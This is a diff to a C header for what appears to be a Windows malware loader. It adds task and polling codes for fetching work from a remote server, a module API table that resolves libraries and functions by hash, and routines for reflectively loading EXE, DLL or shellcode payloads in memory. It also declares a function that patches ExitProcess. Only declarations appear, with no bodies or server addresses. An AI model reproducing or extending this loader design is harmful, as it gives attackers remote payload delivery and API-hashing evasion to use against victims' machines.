@@ -8,11 +8,44 @@ typedef struct _LdrMemContext {
 	PVOID BaseAddress;
 } LdrMemContext;
 
+
+typedef struct _LdrTask {
+	DWORD code;
+	DWORD DataSize;
+	DWORD FileType;
+	PBYTE Data;
+	BOOL ok;
+} LdrTask;
+
 #define FILE_EXE       0xac
 #define FILE_DLL 	   0xab
 #define FILE_SHELLCODE 0xad
 
+#define TASK_LOAD 0x1
+#define TASK_PULL_CORE 0x2
+#define TASK_MODULE 0x3
+#define TASK_NO_TASK 0xff
+
+#define MSG_GET_FILE 0xab
+#define POLL_CODE    0xac
+
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+
+
+typedef struct _Module {
+	DWORD size;
+	DWORD Version;
+
+	void (WINAPI *ModuleWrite4)(PVOID ctx, DWORD val);
+	void (WINAPI *ModuleWriteStr)(PVOID ctx, PCHAR str, DWORD len);
+
+	HMODULE (WINAPI *ModuleGetModule)(DWORD hash);
+	FARPROC (WINAPI *ModuleGetProc)(HMODULE mod, DWORD hash);
+	HMODULE (WINAPI *ModuleLoadLibraryA)(PCHAR name);
+	BOOL    (WINAPI *ModuleFreeLibrary)(HMODULE mod);
+} Module, *pModule;
+
+typedef BOOL (WINAPI* pModuleEntry)(pModule api, PVOID ctx, PBYTE args, DWORD ArgLen);
 
 
 #define DOS_HEADER(base)       ((PIMAGE_DOS_HEADER)(base))
@@ -24,13 +57,17 @@ typedef struct _LdrMemContext {
 
 #define CurrentProcess() ((HANDLE)-1)
 
-LdrInfo LdrPullFile();
-BOOL LdrLoadAndRun(LdrInfo info, BOOL CleanUpAfter);
-BOOL LdrRunExe(LdrInfo info);
+LdrTask LdrPullFile();
+void LdrInitPoll();
+LdrTask LdrPollServer();
+BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter);
+BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter);
+BOOL LdrRunExe(LdrTask info);
 
 BOOL   HasReloc(PBYTE pe);
 DWORD  SectionCharsToProt(DWORD chars);
 void   LdrCopySections(PVOID Base, PBYTE Raw, PIMAGE_SECTION_HEADER sec, WORD numSections);
 BOOL   LdrProcessRelocs(PVOID Base, PBYTE Raw);
 void   LdrProcessIAT(PVOID Base, PBYTE Raw);
+void LdrPatchExitProcess(void);
 void   LdrSetSectionPerms(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections);
